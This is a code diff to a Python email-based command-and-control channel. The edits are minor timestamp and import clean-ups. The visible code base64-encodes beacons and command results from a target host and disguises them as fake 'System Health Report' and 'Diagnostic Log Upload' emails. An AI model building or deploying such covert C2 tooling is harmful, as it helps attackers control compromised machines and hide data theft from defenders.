@@ -8,14 +8,13 @@ import base64
 import json
 import os
 import random
-import re
 import sys
 import threading
 import time
-from datetime import datetime
+from datetime import datetime, timezone
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from typing import Any, Callable, Dict, Optional
+from typing import Callable, Dict, Optional
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.logger import logger
@@ -99,7 +98,7 @@ class EmailC2Channel:
 
             payload = data or {}
             payload["id"] = self.target_id
-            payload["ts"] = datetime.utcnow().isoformat()
+            payload["ts"] = datetime.now(timezone.utc).isoformat()
             body = base64.b64encode(json.dumps(payload).encode()).decode()
 
             msg = MIMEMultipart()
@@ -147,7 +146,7 @@ class EmailC2Channel:
                 "id": self.target_id,
                 "cmd_id": command_id,
                 "result": result,
-                "ts": datetime.utcnow().isoformat(),
+                "ts": datetime.now(timezone.utc).isoformat(),
             }
             body = base64.b64encode(json.dumps(payload).encode()).decode()
 
@@ -290,7 +289,7 @@ class EmailC2Channel:
                 "System Health Report\n"
                 "====================\n"
                 "Status: All services running normally\n"
-                f"Timestamp: {datetime.utcnow().isoformat()}\n"
+                f"Timestamp: {datetime.now(timezone.utc).isoformat()}\n"
                 "CPU: 23%\n"
                 "Memory: 45%\n"
                 "Disk: 67%\n"
@@ -302,7 +301,7 @@ class EmailC2Channel:
                 "<html><body>"
                 "<h3>System Health Report</h3>"
                 "<pre>Status: All services running normally</pre>"
-                f"<p>Timestamp: {datetime.utcnow().isoformat()}</p>"
+                f"<p>Timestamp: {datetime.now(timezone.utc).isoformat()}</p>"
                 "<p>This is an automated system message.</p>"
                 "</body></html>"
             ),
@@ -310,7 +309,7 @@ class EmailC2Channel:
                 "Diagnostic Log Upload\n"
                 "=====================\n"
                 f"Host: {self.target_id}\n"
-                f"Time: {datetime.utcnow().isoformat()}\n"
+                f"Time: {datetime.now(timezone.utc).isoformat()}\n"
                 "Log file attached.\n"
             ),
             "log_upload_html": (
